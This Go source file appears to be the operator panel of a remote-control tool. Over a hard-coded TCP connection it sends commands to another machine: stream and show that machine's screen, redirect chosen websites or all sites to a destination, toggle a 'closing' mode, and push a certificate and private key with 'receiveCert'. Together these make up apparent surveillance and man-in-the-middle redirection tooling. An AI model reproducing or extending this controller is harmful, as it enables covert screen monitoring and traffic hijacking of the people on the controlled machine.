package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"github.com/aarzilli/nucular"
	"github.com/aarzilli/nucular/rect"
	_ "github.com/aarzilli/nucular/style"
	nstyle "github.com/aarzilli/nucular/style"
	"github.com/disintegration/imaging"
	"golang.org/x/image/draw"
	"image"
	"image/jpeg"
	"io"
	"log"
	"net"
	"os"
	_ "runtime/pprof"
	_ "runtime/trace"
	"time"
)

var img image.Image

func displayimg(conn net.Conn) {

	for {
		buf := make([]byte, 1024*1024)
		n, err := conn.Read(buf)
		if err != nil {
			log.Println(err)
			return
		}
		encoded := buf[:n]
		decoded, err := base64.StdEncoding.DecodeString(string(encoded))
		if err != nil {
			log.Println(err)
			continue
		}
		img, err = jpeg.Decode(bytes.NewReader(decoded))
		if err != nil {
			log.Println(err)
			continue
		}
	}
}

type overview struct {
	HeaderAlign nstyle.HeaderAlign
	Theme       nstyle.Theme
}

func (od *overview) screenfunc(w *nucular.Window) {
	mw := w.Master()

	style := mw.Style()
	style.NormalWindow.Header.Align = od.HeaderAlign
	if w.TreePush(nucular.TreeTab, "Image & Custom", false) {
		go displayimg(conn)
		if img != nil {
			resized := imaging.Resize(img, w.LayoutAvailableWidth(), w.LayoutAvailableHeight(), imaging.Lanczos)
			bounds := resized.Bounds()
			img2 := image.NewRGBA(bounds)
			draw.Draw(img2, bounds, resized, image.Point{}, draw.Src)
			w.RowScaled(img2.Bounds().Dy()).StaticScaled(img2.Bounds().Dx())
			w.Image(img2)
		} else {
			w.Row(25).Dynamic(1)
			w.Label("could not load image", "LC")
		}

		w.RowScaled(335).StaticScaled(500)
		w.TreePop()

	}

}

var times = 0

func sendCrt() {
	certFile := "demo.crt"
	keyFile := "demo.key"

	cert, err := os.Open(certFile)
	if err != nil {
		fmt.Println("Failed to open certificate file:", err)
		os.Exit(1)
	}
	defer cert.Close()

	key, err := os.Open(keyFile)
	if err != nil {
		fmt.Println("Failed to open key file:", err)
		os.Exit(1)
	}
	defer key.Close()
	buffer2 := make([]byte, 1024)

	// Send certificate file
	_, err = io.CopyBuffer(conn, cert, buffer2)
	if err != nil {
		fmt.Println("Failed to send certificate file:", err)
		os.Exit(1)
	}

	// Send key file
	_, err = io.CopyBuffer(conn, key, buffer2)
	if err != nil {
		fmt.Println("Failed to send key file:", err)
		os.Exit(1)
	}

	fmt.Println("Files transferred successfully!")
}

func redirectmenu() func(w *nucular.Window) {
	var source nucular.TextEditor
	source.Flags = nucular.EditSelectable | nucular.EditClipboard
	source.Buffer = []rune("source")
	var dest nucular.TextEditor
	dest.Flags = nucular.EditSelectable | nucular.EditClipboard
	dest.Buffer = []rune("dest")

	return func(w *nucular.Window) {
		w.Row(30).Dynamic(1)
		source.Maxlen = 100
		source.Edit(w)
		w.Row(30).Dynamic(1)
		dest.Maxlen = 100
		dest.Edit(w)
		if w.ButtonText("start redirect") {
			//in case other redirect option was selected first and changed into this - prevents needing to press the close redirect every time
			if times > 0 {
				_, err := fmt.Fprintf(conn, "%s\n", "stopRedirect")
				if err != nil {
					fmt.Println("Error sending command:", err)
					return
				}
			}

			times += 1
			_, err := fmt.Fprintf(conn, "%s%s%s%s\n", "redirect ", string(source.Buffer), " ", string(dest.Buffer))
			if err != nil {
				fmt.Println("Error sending command:", err)
			}
			fmt.Println("sentt")
		}
		if w.ButtonText("redirect all sites into dest") {
			//in case other redirect option was selected first and changed into this - prevents needing to press the close redirect every time
			if times > 0 {
				_, err := fmt.Fprintf(conn, "%s\n", "stopRedirect")
				if err != nil {
					fmt.Println("Error sending command:", err)
					return
				}
			}

			times += 1
			_, err := fmt.Fprintf(conn, "%s%s%s\n", "redirect ", "all ", string(dest.Buffer))
			if err != nil {
				fmt.Println("Error sending command:", err)
				return
			}
		}
		if w.ButtonText("stop redirect") {
			times = 0
			_, err := fmt.Fprintf(conn, "%s\n", "stopRedirect")
			if err != nil {
				fmt.Println("Error sending command:", err)
				return
			}
		}
		if w.ButtonText("send certificate") {
			sendCrt()
			_, err := fmt.Fprintf(conn, "%s\n", "receiveCert")
			if err != nil {
				fmt.Println("Error sending command:", err)
				return
			}
		}
	}
}

func (od *overview) redirectfunc(w *nucular.Window) {
	mw := w.Master()

	style := mw.Style()
	style.NormalWindow.Header.Align = od.HeaderAlign
	w.Row(20).Dynamic(1)
	var source nucular.TextEditor
	source.Flags = nucular.EditSelectable
	source.Buffer = []rune("source")
	source.Maxlen = 30
	source.Edit(w)
	w.Row(20).Dynamic(1)

}

type menu struct {
	Name     string
	Title    string
	Flags    nucular.WindowFlags
	UpdateFn func() func(*nucular.Window)
}

var theme nstyle.Theme = nstyle.DarkTheme

var menuscreen = menu{"menu", "menu", 0, func() func(*nucular.Window) {
	od := &overview{}
	od.Theme = theme
	od.HeaderAlign = nstyle.HeaderLeft
	return od.screenfunc
}}

var menuredirect = menu{"menu", "menu", 0, func() func(*nucular.Window) {
	od := &overview{}
	od.Theme = theme
	od.HeaderAlign = nstyle.HeaderRight
	return od.redirectfunc
}}

var x = 1
var conn, _ = net.Dial("tcp", "192.168.172.110:9090")

func mainmenu(w *nucular.Window) {
	mw := w.Master()
	style := mw.Style()
	style.NormalWindow.Header.Align = nstyle.HeaderAlign(theme)
	w.Row(25).Dynamic(1)
	if w.ButtonText("watch screen") {
		_, err := fmt.Fprintf(conn, "%s\n", "screen")
		fmt.Println("sent screen")
		if err != nil {
			fmt.Println("Error sending command:", err)
			return
		}
		mw.PopupOpen("screen", nucular.WindowDefaultFlags|nucular.WindowNonmodal|0, rect.Rect{0, 0, 400, 300}, true, menuscreen.UpdateFn())
		fmt.Println(1)
	}
	if w.ButtonText("enter redirect menu") {
		mw.PopupOpen("redirect", nucular.WindowDefaultFlags|nucular.WindowNonmodal|0, rect.Rect{0, 0, 400, 300}, true, redirectmenu())

	}

	if w.ButtonText("start closing") {
		_, err := fmt.Fprintf(conn, "%s\n", "closing")
		if err != nil {
			fmt.Println("Error sending command:", err)
			return
		}
	}
	if w.ButtonText("stop closing") {
		_, err := fmt.Fprintf(conn, "%s\n", "stopClosing")
		if err != nil {
			fmt.Println("Error sending command:", err)
			return
		}
	}
}

//if w.TreePush(nucular.TreeTab, "closing", false) {
//	w.RowScaled(25).Dynamic(1)
//	w.TreePop()
//}

const scaling = 1.8

var Wnd nucular.MasterWindow

func main() {

	Wnd = nucular.NewMasterWindow(0, "menu", func(w *nucular.Window) {})
	Wnd.PopupOpen("menu", nucular.WindowTitle|nucular.WindowBorder|nucular.WindowMovable|nucular.WindowScalable|nucular.WindowNonmodal, rect.Rect{0, 0, 400, 300}, true, mainmenu)
	Wnd.SetStyle(nstyle.FromTheme(theme, scaling))
	go func() {
		for {
			time.Sleep(time.Millisecond)
			Wnd.Changed()
		}
	}()
	Wnd.Main()

	//wnd.SetStyle(style.FromTheme(style.DarkTheme, 2.0))
	//wnd.Main()

}

//func updatefn(w *nucular.Window) {
//	if w.TreePush(nucular.TreeTab, "Image & Custom", false) {
//
//		if img3 != nil {
//			w.RowScaled(img3.Bounds().Dy()).StaticScaled(img3.Bounds().Dx())
//			w.Image(img3)
//		} else {
//			w.Row(25).Dynamic(1)
//			w.Label("could not load example image", "LC")
//		}
//
//		w.RowScaled(335).StaticScaled(500)
//		w.TreePop()
//	}
//}
